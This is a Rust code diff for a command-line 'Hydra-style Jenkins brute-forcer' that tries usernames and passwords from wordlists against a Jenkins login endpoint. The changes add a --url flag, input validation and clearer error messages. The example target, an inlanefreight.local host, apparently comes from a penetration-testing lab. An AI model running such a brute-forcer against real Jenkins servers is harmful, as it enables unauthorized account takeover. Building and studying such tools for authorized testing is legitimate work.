@@ -1,4 +1,4 @@
-use anyhow::Result;
+use anyhow::{bail, Context, Result};
 use clap::Parser;
 use rayon::prelude::*;
 use rayon::ThreadPoolBuilder;
@@ -12,10 +12,14 @@ use reqwest::blocking::{Client, Response};
 
 /// Hydra‑style Jenkins brute‑forcer (configurable login POST path)
 #[derive(Parser, Debug)]
-#[command(version, about = "Brute‑force Jenkins login with -L/-l and -P/-p")]
+#[command(
+    version,
+    about = "Brute‑force Jenkins login with -L/-l and -P/-p",
+    after_help = "Credentials:\n  -l = one username   -L = file of usernames (uppercase)\n  -p = one password   -P = file of passwords (uppercase)\n\nRequires --url, at least one of -l/-L, and at least one of -p/-P."
+)]
 struct Args {
-    /// Target URL (e.g., http://jenkins.inlanefreight.local:8000)
-    #[arg(index = 1, required = true)]
+    /// Target Jenkins base URL (e.g., http://jenkins.inlanefreight.local:8000)
+    #[arg(short = 'u', long = "url", required = true, value_name = "URL")]
     url: String,
 
     /// Login form POST path (varies by Jenkins version; e.g. j_spring_security_check, j_acegi_security_check)
@@ -44,12 +48,12 @@ struct Args {
 }
 
 /// Line-based wordlists often contain invalid UTF-8 (e.g. rockyou). Decode lossily per line.
-fn load_lines(path: &str) -> Result<Vec<String>> {
-    let file = File::open(path)?;
+fn load_wordlist(path: &str, option_label: &str) -> Result<Vec<String>> {
+    let file = File::open(path).with_context(|| format!("{option_label}: cannot open {path:?}"))?;
     let reader = BufReader::new(file);
     let mut lines = Vec::new();
     for chunk in reader.split(b'\n') {
-        let chunk = chunk?;
+        let chunk = chunk.with_context(|| format!("{option_label}: read error in {path:?}"))?;
         let s = String::from_utf8_lossy(&chunk)
             .trim_end_matches('\r')
             .to_string();
@@ -120,32 +124,108 @@ impl Progress {
     }
 }
 
-fn main() -> Result<()> {
+fn main() {
+    if let Err(e) = run() {
+        eprintln!("Error: {:#}", e);
+        std::process::exit(1);
+    }
+}
+
+fn run() -> Result<()> {
     let args = Args::parse();
 
-    let url = args.url.trim_end_matches('/');
+    let url = args.url.trim();
+    if url.is_empty() {
+        bail!("--url must not be empty");
+    }
+    if !(url.starts_with("http://") || url.starts_with("https://")) {
+        bail!(
+            "--url must start with http:// or https:// (got: {url:?})\n\
+             Example: --url http://jenkins.example:8080"
+        );
+    }
+    let url = url.trim_end_matches('/');
+
     let endpoint = args.endpoint.trim().trim_matches('/').to_string();
     if endpoint.is_empty() {
-        eprintln!("Error: --endpoint must not be empty");
-        std::process::exit(1);
+        bail!("--endpoint must not be empty (use default or e.g. j_acegi_security_check)");
+    }
+
+    let has_user_source = args.user.is_some() || args.user_file.is_some();
+    let has_pass_source = args.password.is_some() || args.pass_file.is_some();
+
+    if !has_user_source {
+        bail!(
+            "no usernames provided.\n\
+             \n\
+             You need at least one of:\n\
+               -l, --user <NAME>        single username (lowercase L)\n\
+               -L, --user-file <PATH>   file with one username per line (uppercase L)\n\
+             \n\
+             Tip: -L is the wordlist file; -l is one name. Example:\n\
+               --url http://... -l admin -P passwords.txt"
+        );
+    }
+    if !has_pass_source {
+        bail!(
+            "no passwords provided.\n\
+             \n\
+             You need at least one of:\n\
+               -p, --password <PASS>    single password (lowercase p)\n\
+               -P, --pass-file <PATH>   file with one password per line (uppercase P)\n\
+             \n\
+             Tip: -P is the wordlist file; -p is one password. Example:\n\
+               --url http://... -l admin -P rockyou.txt"
+        );
+    }
+
+    if let Some(ref u) = args.user {
+        if u.trim().is_empty() {
+            bail!(
+                "-l/--user value is empty.\n\
+                 Provide a non-empty username, or remove -l and use only -L <file>."
+            );
+        }
+    }
+    if let Some(ref p) = args.password {
+        if p.trim().is_empty() {
+            bail!(
+                "-p/--password value is empty.\n\
+                 Provide a non-empty password, or remove -p and use only -P <file>."
+            );
+        }
     }
 
     // 1. Users
     let mut users = Vec::new();
-    if let Some(u) = args.user {
-        users.push(u);
+    if let Some(u) = args.user.clone() {
+        users.push(u.trim().to_string());
     }
-    if let Some(path) = args.user_file {
-        users.extend(load_lines(&path)?);
+    if let Some(ref path) = args.user_file {
+        let from_file = load_wordlist(path, "-L / --user-file")?;
+        if from_file.is_empty() && args.user.is_none() {
+            bail!(
+                "user wordlist {path:?} has no non-empty lines (file empty or only blank lines).\n\
+                 You passed -L but no -l; add usernames to the file or use -l <user>."
+            );
+        }
+        users.extend(from_file);
     }
 
     // 2. Passwords
     let mut passwords = Vec::new();
-    if let Some(p) = args.password {
-        passwords.push(p);
+    if let Some(p) = args.password.clone() {
+        passwords.push(p.trim().to_string());
     }
-    if let Some(path) = args.pass_file {
-        passwords.extend(load_lines(&path)?);
+    if let Some(ref path) = args.pass_file {
+        let from_file = load_wordlist(path, "-P / --pass-file")?;
+        if from_file.is_empty() && args.password.is_none() {
+            bail!(
+                "password wordlist {path:?} has no non-empty lines (file empty or only blank lines).\n\
+                 You passed -P but no -p; add passwords to the file or use -p <password>."
+            );
+        }
+        passwords.extend(from_file);
     }
 
     let users: Vec<String> = {
@@ -161,15 +241,22 @@ fn main() -> Result<()> {
         v
     };
 
-    if users.is_empty() || passwords.is_empty() {
-        eprintln!("Error: need at least one user and one password (via -l / -L / -p / -P)");
-        std::process::exit(1);
+    if users.is_empty() {
+        bail!(
+            "no usernames to try after loading lists (all duplicates removed, or invalid input).\n\
+             Check -l / -L and file contents."
+        );
+    }
+    if passwords.is_empty() {
+        bail!(
+            "no passwords to try after loading lists (all duplicates removed, or invalid input).\n\
+             Check -p / -P and file contents."
+        );
     }
 
     let num_threads = match args.threads {
         Some(0) => {
-            eprintln!("Error: --threads must be at least 1");
-            std::process::exit(1);
+            bail!("--threads must be at least 1 (got 0)");
         }
         Some(n) => n,
         None => {
